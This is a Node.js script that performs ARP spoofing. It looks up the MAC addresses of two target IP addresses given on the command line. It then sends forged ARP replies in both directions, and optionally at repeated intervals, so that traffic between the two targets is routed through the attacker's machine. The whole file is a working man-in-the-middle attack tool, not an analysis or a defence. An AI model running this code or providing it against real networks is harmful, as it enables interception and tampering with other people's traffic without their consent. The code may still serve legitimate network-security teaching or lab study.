"use strict";

var Cap = require('cap').Cap,
  ip = require("ip"),
  timers = require("timers"),
  device = Cap.findDevice(ip.address()),
  getmac = require('getmac').getMac,
  Q = require('q'),
  filter = 'arp',
  bufSize = 10 * 1024 * 1024,
  socketBuffer = new Buffer(65535),
  OPERATION = {
    REQUEST:  1,
    REPLY: 2
  },
  attacker = {
    ip: ip.address(),
    mac: null
  };

var target1 = { ip: null, mac: null },
  target2 = { ip: null, mac: null },
  interval = null;
var targets = [target1, target2]
if(process.argv.length > 1) {
  target1.ip = process.argv[2];
  target2.ip = process.argv[3];
  if(typeof process.argv[4] !== "undefined") {
    interval = parseInt(process.argv[4]) * 1000;
  }
}

Q.nfcall(findOurHardwareAddress)
  .then(findTargetHardwareAddresses)
  .then(function() {
    if(target1.mac !== null && target2.mac !== null) {
      console.log("\nSending single pair of ARP replies");
      spoofBothWays(target1, target2, attacker.mac);

      if(interval !== null) {
        console.log("\nSending additional ARP replies every " + interval + " milliseconds");
        setInterval(spoofBothWays, interval, target1, target2);
      }

      if(interval === null) {
        process.exit();
      } else {
        // Stick around for the interval
      }
    }
  });



function findOurHardwareAddress(next) {
  // Finds the hardware (MAC) addresses of the host and targets
  getmac((err, mac) => {
    console.log("Attacker MAC:", mac);
    attacker.mac = mac;
    next();
  });
}

function findTargetHardwareAddresses(next) {
  var deferred = Q.defer();

  arpRequest(target1, function (mac) {
    target1.mac = mac;

    arpRequest(target2, function (mac) {
      target2.mac = mac;

      deferred.resolve();
    });
  });

  return deferred.promise;
};

var spoofBothWays = (target1, target2) => {
  spoof(target1, target2);
  spoof(target2, target1);
};

var spoof = function (src, dst, mac) {
  // Send reply from target1 to broadcast, advertising new hardware address
  var packet = createARPPacket();

  packet.arp.operation.writeUIntBE(OPERATION.REPLY, 0, 2);

  setMac(packet.arp.target_mac, dst.mac);
  setMac(packet.eth.target_mac, dst.mac);

  setMac(packet.arp.sender_mac, attacker.mac);
  setMac(packet.eth.sender_mac, attacker.mac);

  setIP(packet.arp.sender_ip, src.ip);
  setIP(packet.arp.target_ip, dst.ip);

  send(packet.buffer);
};

var arpRequest = function(target, next) {
  var c = new Cap();
  var packet = createARPPacket();

  packet.arp.operation.writeUIntBE(OPERATION.REQUEST, 0, 2);

  packet.arp.target_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.target_mac.length);
  packet.eth.target_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.target_mac.length);

  setMac(packet.eth.sender_mac, attacker.mac);
  setMac(packet.arp.sender_mac, attacker.mac);
  setIP(packet.arp.sender_ip, attacker.ip);
  setIP(packet.arp.target_ip, target.ip);

  c.open(device, filter, bufSize, socketBuffer);
  c.setMinBytes(42); // Length of an ARP packet

  console.log("Sending ARP Request for ", target.ip);
  c.send(packet.buffer, packet.buffer.length);

  c.on("packet", (nbytes) => {
    var response = createARPPacket(socketBuffer.slice(0, nbytes));

    if(response.arp.operation.readInt16BE(0) === OPERATION.REPLY) {
      var mac = buf2macString(response.arp.sender_mac);
      var senderIp = buf2ipString(response.arp.sender_ip);

      if(typeof mac !== "undefined" && senderIp === target.ip) {
        next(mac);
        c.close();

        console.log(target.ip,"found at", mac);
      }
    } else {
    }
  });
};

var send = function(buffer) {
  var c = new Cap();
  try {
    console.log("Sending reply:", buffer);
    c.open(device, filter, bufSize, socketBuffer);
    c.send(buffer, buffer.length);
    c.close();
  } catch (e) {
    console.log("Error sending packet:", e);
  }
};

var setMac = function (buffer, addr) {
  // Poorly named; goes from the string "FF-FF-FF-FF-FF-FF" to 0xFFFFFFFFFFFF, then writes that value to buffer
  var mac = parseInt(addr.split("-").join(""), 16);
  buffer.writeUIntBE(mac, 0, 6);
};

var setIP = function(buffer, ip) {
  var ip_blocks = ip.toString().split(".");
  for(var i = 0; i < ip_blocks.length; i++) {
    buffer.writeUIntBE(parseInt(ip_blocks[i]), i, 1);
  }
};

var buf2macString = function(buf) {
  // Takes a buffer containing a MAC address, gives it back as a hyphen-delimited string, e.g. "FF-FF-FF-FF-FF-FF"
  return buf.toString('hex').match(/.{1,2}/g).join('-');
};

var buf2ipString = function(buf) {
  // Takes a 4-byte buffer, returns an ip, interpreting each byte as a segment
  return [
    buf.readUIntBE(0,1).toString(),
    buf.readUIntBE(1,1).toString(),
    buf.readUIntBE(2,1).toString(),
    buf.readUIntBE(3,1).toString()].join(".");

};

var createARPPacket = function(buf) {
  var buffer = buf;
  if(typeof buffer === "undefined") {
    buffer = new Buffer([
      // ETHERNET
      0xff, 0xff, 0xff, 0xff, 0xff,0xff,                  // 0    = Destination MAC
      0x84, 0x8F, 0x69, 0xB7, 0x3D, 0x92,                 // 6    = Source MAC
      0x08, 0x06,                                         // 12   = EtherType = ARP
      // ARP
      0x00, 0x01,                                         // 14/0   = Hardware Type = Ethernet (or wifi)
      0x08, 0x00,                                         // 16/2   = Protocol type = ipv4 (request ipv4 route info)
      0x06, 0x04,                                         // 18/4   = Hardware Addr Len (Ether/MAC = 6), Protocol Addr Len (ipv4 = 4)
      0x00, 0x01,                                         // 20/6   = Operation (ARP, who-has)
      0x84, 0x8f, 0x69, 0xb7, 0x3d, 0x92,                 // 22/8   = Sender Hardware Addr (MAC)
      0xc0, 0xa8, 0x01, 0xc8,                             // 28/14  = Sender Protocol address (ipv4)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                 // 32/18  = Target Hardware Address (Blank/nulls for who-has)
      0xc0, 0xa8, 0x01, 0xc9                              // 38/24  = Target Protocol address (ipv4)
    ]);
  }

  var packet = {
    eth: {
      target_mac: buffer.slice(0,6),
      sender_mac: buffer.slice(6,12),
      ethertype: buffer.slice(12,14)
    },
    arp: {
      hardwareType: buffer.slice(14,16),
      protocol: buffer.slice(16,18),
      hardwareAddressLen: buffer.slice(18,20),
      operation: buffer.slice(20,22),
      sender_mac: buffer.slice(22,28),
      sender_ip: buffer.slice(28,32),
      target_mac: buffer.slice(32,38),
      target_ip: buffer.slice(38,42)
    }
  };

  packet.buffer = buffer;

  return packet;
};
  